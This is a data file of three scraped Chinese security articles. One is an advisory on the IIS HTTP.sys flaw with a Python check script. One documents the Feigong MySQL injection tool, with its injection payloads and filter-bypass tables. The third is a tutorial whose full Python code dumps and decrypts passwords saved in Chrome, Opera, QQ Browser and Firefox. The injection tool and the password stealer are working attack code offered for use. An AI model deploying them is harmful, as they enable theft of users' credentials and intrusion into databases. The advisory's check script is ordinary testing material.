"5ccbfa394f2f0a0a7a69c02f","在微软4月14日补丁日发布的补丁中，有一个针对IIS服务器的远程代码执行漏洞危害非常大，请广大用户注意。","Kong","在微软4月14日补丁日发布的补丁中，有一个针对IIS服务器的远程代码执行漏洞危害非常大，请广大用户注意。漏洞信息远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，安装更新可以修复此漏洞。危害评级严重影响范围影响以下版本操作系统的IIS服务器Windows 7Windows 8Windows server 2008Windows server 2012修复方法目前微软官方已经给出修复补丁（3042553），用户安装修复补丁即可。参考https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspxhttps://support.microsoft.com/zh-cn/kb/3042553附测试POC注：此脚本可验证服务器是否存在漏洞，但并没有经过充分的测试，不排除会产生不可预知的后果，请谨慎使用！import socketimport randomipAddr = """"hexAllFfff = ""18446744073709551615""req1 = ""GET / HTTP/1.0\r\n\r\n""req = ""GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-"" + hexAllFfff + ""\r\n\r\n""print ""[*] Audit Started""client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client_socket.connect((ipAddr, 80))client_socket.send(req1)boringResp = client_socket.recv(1024)if ""Microsoft"" not in boringResp:                print ""[*] Not IIS""                exit(0)client_socket.close()client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client_socket.connect((ipAddr, 80))client_socket.send(req)goodResp = client_socket.recv(1024)if ""Requested Range Not Satisfiable"" in goodResp:                print ""[!!] Looks VULN""elif "" The request has an invalid header name"" in goodResp:                print ""[*] Looks Patched""else:                print ""[*] Unexpected response, cannot discern patch status""相关阅读：MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析","2016-10-02 16:50:35","系统安全","IIS远程代码执行漏洞（CVE-2015-1635）","http://nsoad.com/Article/system/20161002/479.html"
"5ccbfa3a4f2f0a0a7a69c030","Feigong，针对各种情况自由变化的mysql注入脚本,In view of the different things freely change the mysql injection script","Blackhold","Feigong，针对各种情况自由变化的mysql注入脚本,In view of the different things freely change the mysql injection script非攻取自《秦时明月》--非攻，针对不同情况自由变化的武器Feigong，针对各种情况自由变化的mysql注入脚本Feigong，In view of the different things freely change the mysql injection script什么是非攻？在sqlmap的使用过程中，常常碰到很普通的绕过过滤方式，例如空格--&gt;%0b、%0a，但是却没办法使用sqlmap来获取数据的情况，于是花了很长时间来完善脚本，让非攻可以通过修改config.py一个文件中的设置，让非攻在面对不同情况时成为了灵活多变的注入脚本...非攻目前集成了对mysql的normal、build、time，3种注入方式...在使用非攻之前1、首先你需要找到一个注入点（在考虑写一个这样的工具）2、判断数据库为mysql3、通过巧妙地过滤可以获取数据4、开始使用非攻TODO完成基本功能优化log存储方式优化build注入、time注入算法优化解包函数，避免自定义解包添加线程池优化注入速度完善对拓展函数的支持增加更多注入语句增加更多绕过过滤方式增加多种数据库更新日志2016-8-5Feigong 0.9.9完成增加 payload处理模块完成2016-8-9Feigong 1.0.0完成增加 log对文件的输出优化 部分错误处理增加 较为完整的文档2016-8-24Feigong 1.0.1完成优化 盲注算法优化 整体结构2016-8-25Feigong 1.1.0完成优化 time盲注算法,从100-&gt;72016-8-26Feigong 1.1.1完成优化 整体结构，避免了自定义解包函数2016-8-27Feigong 1.2.0完成重构 config-&gt;config、advanced_config优化 整体结构，大幅度减少冗余代码使用文档Feigong│  .gitignore│  feigong.py│  README.md│├─demo│  ├─demo1│  │      advanced_config.py│  │      config.py│  ││  └─demo2│          advanced_config.py│          config.py│├─lib│      Conpayload.py│      data.py│      dealpayload.py│      log.py│      unpack.py│      __init__.py│├─log│└─sqlier    │  advanced_config.py    │  config.py    │  __init__.py    │    ├─configuration    │      buildconfig.py    │      __init__.py    │    ├─default    │      advanced_config_default.py    │      config_default.py    │      __init__.py    │    ├─tamper    │      expand.py    │      __init__.py    │    └─techniques            columns.py            content.py            database.py            tables.py            test.py            __init__.pyFeigong一切一切的核心在于sqlier/config.py和sqlier/advanced_config.py,代码层的自定义可以面对任何情况安装你可以通过点击下载，或者git clone来获取源码git clone https://github.com/LoRexxar/Feigong.git使用首先你需要安装依赖pip install -r requirements.txt打开对应Feigong的目录，跑一下默认demo看看结果python feigong.py开始Feigong是通过修改sqlier/config.py &amp; sqlier/advanced_config.py来实现注入的，config.py是feigong的基础配置，advanced_config.py是进阶配置，而default中是默认的配置文件，以免默认修改过后找不到正确的配置。config.py是基础配置，只有基础配置完成的情况下才能进行正常的配置。class BaseConfig:    def __init__(self):        """"""        基类初始化，整个注入工具的核心配置        """"""        # 目标url        self.url = 'http://demo.lorexxar.pw/get.php'        # 请求头参数        # cookies = {""username"":data,""path"":""/admin/"",""domain"":""451bf8ea3268360ee.jie.sangebaimao.com""}        # self.headers = {""Cookie"": ""username="" + data + ""; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username="" + data}        self.headers = {}        # 传参方式 0为GET 1为POST        SqliRequest = (            ""GET"",            ""POST""        )        self.sqlirequest = SqliRequest[0]        # 注入方式 0为正常 1为盲注 2为时间盲注        SqliMethod = (            ""normal"",            ""build"",            ""time""        )        self.sqlimethod = SqliMethod[1]        """"""        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求        payload===&gt;替换为指定payload===&gt;自定义替换表===&gt;请求===&gt;开始注入        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））        eg: self.payload = ""padding' union all select 1,'Feigong' #""        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件        eg: self.payload = ""padding' &amp;&amp; 2333 #""        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充        eg: self.payload = ""padding' union all select 1,'Feigong' #""        eg: self.payload = ""padding' &amp;&amp; 2333 #""        """"""        self.payload = ""padding' &amp;&amp; 2333 #""        """"""        配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）        self.requesetformat = ""user=Feigong&amp;passwd=ddog123&amp;submit=Log+In""        self.requesetformat = {""user"": ""Feigong"", ""password"": ""a""}        """"""        self.requesetformat = ""user=Feigong&amp;passwd=ddog123&amp;submit=Log+In""        # self.requesetformat = {""user"": ""Feigong"", ""password"": ""a""}        """"""        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启        而testmethod则是选择使用那种测试，互相兼容可以同时跑        """"""        self.wtest = False        self.testmethod = {            ""test"": 0,            ""database"": 1,            ""version"": 1,            ""user"": 1        }        """"""        正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启        all为全部注入，将自动从database注入直到数据前10条        content为注入数据，可以预设columns、tables和database        columns为注入列名，可以预设tables和database        tables为注入表名，可以预设database        database为注入表名        统一规则为如果不预设，则自动调用上一层的类获取数据        """"""        self.wsqli = True        self.sqlilocation = {            ""content"": 1,            ""columns"": 1,            ""tables"": 1,            ""database"": 1        }advanced_config.py是进阶配置，进阶配置可以配置一些特殊的请况class AdvanceConfig(BaseConfig):    def __init__(self):        """"""        进阶配置，如果对代码不够熟悉，建议不修改这部分配置        """"""        BaseConfig.__init__(self)        # 版本号        self.version = ""V1.2.0""        # 初始化request        self.s = requests.Session()        # log日志级别，debug为显示大部分信息，info为注入结果的显示        LogLevel = (            logging.DEBUG,            logging.INFO,            logging.WARN        )        self.loglevel = LogLevel[0]        """"""        若注入方式为build盲注，则通过返回长度判断        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len        """"""        self.len = 0        """"""        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿        建议2-5，现在版本还是单线程，所以时间盲注会比较慢...        """"""        self.time = 3        """"""        database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式        self.databases_name = ['test', 'test2']（当然，如果database_name错误...则不会注到数据）        """"""        # self.databases_name = ['hctfsqli1', 'test']        self.databases_name = []        """"""        然后是table name，tables_name的格式为字典+元组        self.tables_name = {'hctfsqli1': ('test1', 'test2'), 'test',('test1', 'test2')}(如果有写错某些值，则会注不到数据)        """"""        # self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}        self.tables_name = {}        """"""        然后是self.columns_name，columns_name的格式为字典套字典+元组        self.columns_name = {'test': {'test': ('test', 'test1', 'test2')}, 'test2': {'test': ('test', 'test1', 'test2')}}        (同样，如果有写错的值，则会注入不到数据)        """"""        # self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}        self.columns_name = {}        """"""        当选择注入content时，你需要指定输入数据的上限，默认为10        """"""        self.content_count = 10        """"""        配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload        """"""        self.filter = {            # padding 为填充字段，build与注入要求padding必须为真值            'padding': 'user1',            # 符号替换（url encode是get默认自带的，不需要修改）            '\'': '\'',            '\""': '\""',            '&amp;': '&amp;',            '|': '|',            '&gt;': '&gt;',            '&lt;': '&lt;',            '=': '=',            '.': '.',            # 注入语句关键字替换            'union': 'union',            'select': 'SELECT',            'insert': 'insert',            'update': 'update',            'delete': 'delete',            'limit': 'limit',            'where': 'where',            # 注入函数            'user': 'user',            'database': 'database',            'version': 'version',            'if': 'if',            'ifnull': 'ifnull',            'concat': 'concat',            'ascii': 'ascii',  # hex()、bin()            'count': 'count',            'substring': 'substring',  # mid()、substr()            'length': 'length',            ""sleep("" + repr(self.time) + "")"": ""sleep("" + repr(self.time) + "")"",  # benchmark()            # 库名表名关键字            'information_schema': 'information_schema',            'schemata': 'schemata',            'schema_name': 'schema_name',            'tables': 'tables',            'table_name': 'table_name',            'columns': 'columns',            'column_name': 'column_name',            # 然后是特殊的字符            ' ': ' ',  # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a-&gt;\n %0b-&gt;\x0b            '#': '#'  # --+        }        """"""        初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter        """"""        self.dealpayload = ConPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)Feigong现在的版本还仅仅支持对于mysql的3种注入方式：普通注入（normal）：也就是会有返回的注入点盲注（build）：没有返回，但可以通过真假条件来判断执行结果时间盲注（time）：没有返回，但是可以通过返回请求的间隔时间来判断真假基础配置首先你需要进行基础的配置，首先是基础的目标url，请求头，传参方式，注入方式等...# 目标urlself.url = 'http://demo.lorexxar.pw/get.php'self.s = requests.Session()# 请求头参数# cookies = {""username"":data,""path"":""/admin/"",""domain"":""451bf8ea3268360ee.jie.sangebaimao.com""}# self.headers = {""Cookie"": ""username="" + data + ""; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username="" + data}self.headers = {}# 传参方式 0为GET 1为POSTSqliRequest = (    ""GET"",    ""POST"")self.sqlirequest = SqliRequest[0]# 注入方式 0为正常 1为盲注 2为时间盲注SqliMethod = (    ""normal"",    ""build"",    ""time"")self.sqlimethod = SqliMethod[0]上面的每一步都给出了相应的参数，目标url中，不需要加上参数，关于参数的配置，我们会在后面进行...ps:如果出现get和post请求都必须存在的情况，若注入点再post，可以直接把get请求代入到目标url中，如果反过来，则暂时不支持注入方式的配置根据这一段的选择，我们会在后面进行不同的配置选项SqliMethod = (    ""normal"",    ""build"",    ""time"")self.sqlimethod = SqliMethod[0]normal如果注入模式为normal，需要定义基础payloadself.payload = ""padding' union all select 1,'Feigong' #""normal注入的基础payload要求必须返回Feigongbuild如果注入模式为build，则需要配置基础payload，设置真值是返回的页面长度若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件eg: self.payload = ""padding' &amp;&amp; 2333 #""对于真值时的返回长度,可自定义，也可以不定义，因为test.py中的test函数会自动设置self.len（使用基础payload） self.len = 0time如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，这部分在进阶配置中，默认为2 self.time = 2如果网络环境太差，建议（2-5）若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充eg: self.payload = ""padding' union all select 1,'Feigong' #""eg: self.payload = ""padding' &amp;&amp; 2333 #""配置请求格式配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）self.requesetformat = ""user=Feigong&amp;passwd=ddog123&amp;submit=Log+In""self.requesetformat = {""user"": ""Feigong"", ""password"": ""a""}上面两个分别是对于get和post请求的请求格式选择注入模式在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_userself.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启而testmethod则是选择使用那种测试，互相兼容可以同时跑self.wtest = Trueself.testmethod = {    ""test"": 0,    ""database"": 1,    ""version"": 1,    ""user"": 1}在test成功后，就要开始正式的注入模式了...正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启content为注入数据，可以预设columns、tables和database，默认注入10条数据 columns为注入列名，可以预设tables和database tables为注入表名，可以预设database database为注入表名 统一规则为如果不预设，则自动调用上一层的类获取数据self.wsqli = Trueself.sqlilocation = {    ""content"": 1,    ""columns"": 1,    ""tables"": 1,    ""database"": 1}进阶配置在进阶配置中，我们是可以通过预设值来减少注入的范围database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式（当然，如果database_name错误...则不会注到数据）self.databases_name = ['hctfsqli1', 'test']self.databases_name = []然后是table name，tables_name的格式为字典+元组(如果有写错某些值，则会注不到数据)self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}self.tables_name = {}然后是self.columns_name，columns_name的格式为字典套字典+元组(同样，如果有写错的值，则会注入不到数据)self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}self.columns_name = {}当选择注入content时，你需要指定输入数据的上限，默认为10self.content_count = 10配置自定义替换表这部分一是在进阶配置中配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload合理的配置替换表，可以定制任意payload，例如#--&gt;group by a#sleep(2)--&gt;benchmark(10000000,sha(1))总之，如果你对代码足够熟悉，可以生成任意payloadself.filter = {    # padding 为填充字段，build与注入要求padding必须为真值    'padding': 'user',    # 符号替换（url encode是get默认自带的，不需要修改）    '\'': '\'',    '\""': '\""',    '&amp;': '&amp;',    '|': '|',    '&gt;': '&gt;',    '&lt;': '&lt;',    '=': '=',    '.': '.',    # 注入语句关键字替换    'union': 'union',    'select': 'SELECT',    'insert': 'insert',    'update': 'update',    'delete': 'delete',    'limit': 'limit',    'where': 'where',    # 注入函数    'user': 'user',    'database': 'database',    'version': 'version',    'if': 'if',    'ifnull': 'ifnull',    'concat': 'concat',    'ascii': 'ascii',  # hex()、bin()    'count': 'count',    'substring': 'substring',  # mid()、substr()    'length': 'length',    ""sleep("" + repr(self.time) + "")"": ""sleep("" + repr(self.time) + "")"",  # benchmark()    # 库名表名关键字    'information_schema': 'information_schema',    'schemata': 'schemata',    'schema_name': 'schema_name',    'tables': 'tables',    'table_name': 'table_name',    'columns': 'columns',    'column_name': 'column_name',    # 然后是特殊的字符    ' ': ' ',   # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a-&gt;\n %0b-&gt;\x0b    '#': '#'    # --+}开始注入python feigong.py工具地址：https://github.com/LoRexxar/Feigong","2016-11-28 18:17:35","安全工具","Feigong，针对各种情况自由变化的mysql注入脚本","http://nsoad.com/Security-tools/20161128/tools-857.html"
"5ccbfa3a4f2f0a0a7a69c031","早就听闻FreeBuf评论区大神多，作为一个菜鸟，在极度惶恐下发表这篇文章只为抛砖引玉，让众多萌新开阔视野。","kong","前言早就听闻FreeBuf评论区大神多，作为一个菜鸟，在极度惶恐下发表这篇文章只为抛砖引玉，让众多萌新开阔视野。本文将会演示怎样使用Python导出Windows系统上浏览器保存的密码、书签、浏览历史等敏感数据。由于时间和个人能力关系，所涉及的浏览器种类、版本有限，还望有大神不吝赐教。环境搭建首先Python环境是必不可少的，强烈推荐使用32位2.7版本（即使你的系统是64位），可免去不少麻烦！然后你需要安装以下库（使用pip快速安装）。pywin32#下载对应版本并安装https://sourceforge.net/projects/pywin32/files/pywin32/shutil:#(非必要，在本文所含代码中仅用来拷贝文件，可使用以下代码代替）import osos.system('copy file directory')pyasn1:#(必要，除非你想造轮子)pip install pyasn1#测试安装是否成功from pyasn1.codec.der import decoderPyCrypto:：    #请确保你使用的Python是32位的，不然会遇到兼容问题#请确保你下载了Visual Studio Community 2015 : https://www.visualstudio.com/zh-hans/downloads/#安装VS的时候请确保勾选Visual C++,Python Tools for Visual Studio #在“..python安装路径...\Lib\distutils目录下有个msvc9compiler.py找到243行                    toolskey = ""VS%0.f0COMNTOOLS"" % version   直接改为 toolskey = ""VS140COMNTOOLS""pip install pycrypto#测试是否安装成功from Crypto.Cipher import DES3#报错的话，先卸载pip uninstall pycrypto#再选择对应编译版下载后安装： http://www.voidspace.org.uk/python/modules.shtml#pycrypto#以上可解决99%安装不成功的问题，还有1%是文件夹名大小写问题Chrome、Opera和QQ浏览器首先，找到浏览器保存数据库的位置#默认位置在：Chrome:C:\Users\当前用户名\AppData\Local\Google\Chrome\User Data\Default#           Opera: C:\Users\当前用户名\AppData\Roaming\Opera Software\Opera Stable#           QQ   : C:\Users\当前用户名\AppData\Local\Tencent\QQBrowser\User Data\Default#          登录QQ后:C:\Users\hasee-pc\AppData\Local\Tencent\QQBrowser\User Data\Default\QQ号码#保存的密码：Chrome&amp;Opera:Login Data#             QQ Browser:EncryptedStorage#书签：Bookmarks#浏览历史：History#使用Python获取路径import osos.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default')分析数据库可以使用一款名叫DB Browser的程序查看数据库结构(http://sqlitebrowser.org/)。以下为Chrome Login Data结构：    打开文件后，选择Browser Data即可看到储存的数据，其中password_value已加密，可使用win32crypt.CryptUnprotectData()解密https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx解密注意，当Chrome在运行的时候，数据库会无法访问，这时候可以把数据库拷贝到一个临时文件夹，读取完成后再删除即可。完整代码如下：#Dump saved password from Chromeimport osimport shutilimport win32cryptclass Chrome:    def get_pwd(self):        path_tab = [            os.path.expanduser('~\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data'),             os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')        ]        data_path = [path for path in path_tab if os.path.exists(path)]        if not data_path:            debug_info = '[-]Chrome data not found.'            return        #More than 1 path valid        if len(data_path) != 1:            data_path = data_path[0]        #Copy file Login Data to avoid locking        try:            shutil.copy(data_path, os.getcwd() + '\\' + 'db_copy') #os.sep = \\            data_path = os.getcwd() + '\\' + 'db_copy'        except Exception,e:            debug_info = '[-]An error occured when copying Login Data:' + e        try:            conn = sqlite3.connect(data_path)            cursor = conn.cursor()        except Exception,e:            debug_info = '[-]An error occured when opening database file:' + e            return        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')        chrome_pwd = []        for res in cursor.fetchall():            values = {}            #Decryption            try:                pwd = win32crypt.CryptUnprotectData(res[2], None, None, None, 0)[1]            except Exception,e:                pwd = ''                debug_info = '[-]An error occured when decrypting password'            values['URL'] = res[0]            values['ID'] = res[1]            values['PWD'] = pwd            chrome_pwd.append(values)        conn.close()        if data_path.endswith('db_copy'):            os.remove(data_path)        return chrome_pwdclass Opera:    def get_path(self):        data_path = os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data')        if os.path.exists(data_path):            return data_path        else:            return     def get_pwd(self):        path = self.get_path()        conn = sqlite3.connect(path)        cursor = conn.cursor()        cursor.execute('SELECT action_url, username_value,password_value FROM logins')        opera_pwd = []        for value in cursor.fetchall():            values = {}            pwd = win32crypt.CryptUnprotectData(value[2],None,None,None,0)[1]            if pwd:                values['URL'] = value[0]                values['ID'] = value[1]                values['PWD'] = pwd                opera_pwd.append(values)            else:                values['URL'] = value[0]                values['ID'] = value[1]                values['PWD'] = ''                opera_pwd.append(values)                        return opera_pwdclass Qq:    def __init__(self):        self.get_path()    def get_path(self):        self.data_path = []        for root,dirs,files in os.walk(os.path.expanduser('~\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default')):            for file in files:                if file == 'EncryptedStorage':                    self.data_path.append(os.path.join(root,file))        return self.data_path    def get_pwd(self):        qq_pwd = []        for path in self.data_path:            shutil.copy(path, os.getcwd() + '\\' + 'db_copy') #os.sep = \\            path = os.getcwd() + '\\' + 'db_copy'            conn = sqlite3.connect(path)            cursor = conn.cursor()            cursor.execute('SELECT str1, str2, blob0 FROM entries')            for res in cursor.fetchall():                values = {}                try:                    pwd = win32crypt.CryptUnprotectData(res[2],None,None,None,0)[1]                except:                    pwd = ''                values['URL'] = res[0]                values['ID'] = res[1]                values['PWD'] = pwd                 qq_pwd.append(values)            conn.close()            os.remove(path)        return qq_pwdp = Chrome() #p = Opera(),p = Qq()for i in p.get_pwd():    print i['URL'],i['ID'],i['PWD']运行结果如下，为了保护隐私，输出结果已“打码”。由于篇幅原因，就不贴导出书签和浏览历史的代码了，毕竟你连账号密码登录地址都知道，还有什么隐私是得不到的呢~~Firefox相比前三款浏览器，Firefox想获取密码要复杂得多，而且还有主密码这个无敌的设定。（推荐各位使用Firefox）选项&gt;&gt;安全&gt;&gt;使用主密码以下代码仅能在未设定主密码的情况下成功运行导出密码，如果目标主机设定主密码，就只能先通过爆破或者字典猜解主密码，再去解密数据。# inspired by pentestbox : pentestbox.orgimport osimport jsonimport hmacimport shutilimport sqlite3import win32cryptfrom hashlib import sha1from struct import unpackfrom base64 import b64decodefrom itertools import productfrom Crypto.Cipher import DES3from pyasn1.codec.der import decoderfrom ConfigParser import RawConfigParserfrom binascii import hexlify, unhexlifyfrom Crypto.Util.number import long_to_bytes class Credentials(object):    def __init__(self, db):        global database_find        self.db = db        if os.path.isfile(db):            f = open(db, 'r')            tmp = f.read()            if tmp:                database_find = True            f.close()class Json_db(Credentials):    def __init__(self, profile):        db = profile + os.sep + ""logins.json""        super(Json_db, self).__init__(db)        def __iter__(self):        if os.path.exists(self.db):            with open(self.db) as fh:                data = json.load(fh)                try:                    logins = data[""logins""]                except:                    raise Exception(""Unrecognized format in {0}"".format(self.db))                                for i in logins:                    yield (i[""hostname""], i[""encryptedUsername""],   i[""encryptedPassword""])class Firefox:    def printASN1(self, d, l, rl):        type = ord(d[0])        length = ord(d[1])        if length&amp;0x80 &gt; 0:             nByteLength = length&amp;0x7f            length = ord(d[2])                          skip=1        else:            skip=0            if type==0x30:            seqLen = length            readLen = 0            while seqLen&gt;0:                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)                seqLen = seqLen - len2                readLen = readLen + len2            return length+2        elif type==6:             return length+2        elif type==4:             return length+2        elif type==5:                         return length+2        elif type==2:             return length+2        else:            if length==l-2:                self.printASN1( d[2:], length, rl+1)                return length       def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData ):                hp = sha1( globalSalt+masterPassword ).digest()        pes = entrySalt + '\x00'*(20-len(entrySalt))        chp = sha1( hp+entrySalt ).digest()        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()        tk = hmac.new(chp, pes, sha1).digest()        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()        k = k1+k2        iv = k[-8:]        key = k[:24]        return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)    def extractSecretKey(self, globalSalt, masterPassword, entrySalt):        if unhexlify('f8000000000000000000000000000001') not in self.key3:            return None        privKeyEntry = self.key3[ unhexlify('f8000000000000000000000000000001') ]        saltLen = ord( privKeyEntry[1] )        nameLen = ord( privKeyEntry[2] )        privKeyEntryASN1 = decoder.decode( privKeyEntry[3+saltLen+nameLen:] )        data = privKeyEntry[3+saltLen+nameLen:]        self.printASN1(data, len(data), 0)        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()        privKeyData = privKeyEntryASN1[0][1].asOctets()        privKey = self.decrypt3DES( globalSalt, masterPassword, entrySalt, privKeyData )        self.printASN1(privKey, len(privKey), 0)        privKeyASN1 = decoder.decode( privKey )        prKey= privKeyASN1[0][2].asOctets()        self.printASN1(prKey, len(prKey), 0)        prKeyASN1 = decoder.decode( prKey )        id = prKeyASN1[0][1]        key = long_to_bytes( prKeyASN1[0][3] )        return key    def getShortLE(self, d, a):        return unpack('&lt;H',(d)[a:a+2])[0]    def getLongBE(self, d, a):        return unpack('&gt;L',(d)[a:a+4])[0]    def readBsddb(self, name):           f = open(name,'rb')                header = f.read(4*15)        magic = self.getLongBE(header,0)        if magic != 0x61561:            print_debug('WARNING', 'Bad magic number')            return False        version = self.getLongBE(header,4)        if version !=2:            print_debug('WARNING', 'Bad version !=2 (1.85)')            return False        pagesize = self.getLongBE(header,12)        nkeys = self.getLongBE(header,0x38)         readkeys = 0        page = 1        nval = 0        val = 1        db1 = []        while (readkeys &lt; nkeys):            f.seek(pagesize*page)            offsets = f.read((nkeys+1)* 4 +2)            offsetVals = []            i=0            nval = 0            val = 1            keys = 0            while nval != val :                keys +=1                key = self.getShortLE(offsets,2+i)                val = self.getShortLE(offsets,4+i)                nval = self.getShortLE(offsets,8+i)                offsetVals.append(key+ pagesize*page)                offsetVals.append(val+ pagesize*page)                  readkeys += 1                i += 4            offsetVals.append(pagesize*(page+1))            valKey = sorted(offsetVals)              for i in range( keys*2 ):                f.seek(valKey[i])                data = f.read(valKey[i+1] - valKey[i])                db1.append(data)            page += 1        f.close()        db = {}        for i in range( 0, len(db1), 2):            db[ db1[i+1] ] = db1[ i ]        return db      def get_path(self):        main_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')        cp = RawConfigParser()        try:            cp.read(os.path.join(main_path,'profiles.ini'))        except:            return []        self.profile_list = []        for section in cp.sections():            if section.startswith('Profile'):                if cp.has_option(section, 'Path'):                    self.profile_list.append(os.path.join(main_path, cp.get(section, 'Path').strip()))        return self.profile_list    def get_pwd(self):        ffox_pwd = []        for profile in self.get_path():            if not os.path.exists(profile + os.sep + 'key3.db'):                continue            self.key3 = self.readBsddb(profile + os.sep + 'key3.db')            if not self.key3:                continue            masterPassword = ''            pwdCheck = self.key3['password-check']              entrySaltLen = ord(pwdCheck[1])            entrySalt = pwdCheck[3: 3+entrySaltLen]            encryptedPasswd = pwdCheck[-16:]            globalSalt = self.key3['global-salt']            cleartextData = self.decrypt3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )            credentials = Json_db(profile)            key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)            for host,user,pwd in credentials:                values = {}                values['URL'] = host                loginASN1 = decoder.decode(b64decode(user))                iv = loginASN1[0][1][1].asOctets()                ciphertext = loginASN1[0][2].asOctets()                login = DES3.new(key,DES3.MODE_CBC,iv).decrypt(ciphertext)                try:                    nb = unpack('B',login[-1])[0]                    values['ID'] = login[:-nb]                except:                    values['ID'] = login                passwdASN1 = decoder.decode(b64decode(pwd))                iv = passwdASN1[0][1][1].asOctets()                ciphertext = passwdASN1[0][2].asOctets()                password = DES3.new(key,DES3.MODE_CBC,iv).decrypt(ciphertext)                try:                    nb = unpack('B',password[-1])[0]                    values['PWD'] = password[:-nb]                except:                    values['PWD'] = password                if len(values):                    ffox_pwd.append(values)        return ffox_pwdp = Firefox()print p.get_pwd()结语就如开头所说，我发表这篇文章的初衷就是抛砖引玉，希望各位大神要喷，就用你们的程序来喷我。对以上内容有任何疑问，欢迎在评论区留言，我会尽力为大家解答。","2016-12-08 13:28:37","安全工具","动手打造自己的渗透工具（浏览器篇）","http://nsoad.com/Security-tools/20161208/tools-897.html"
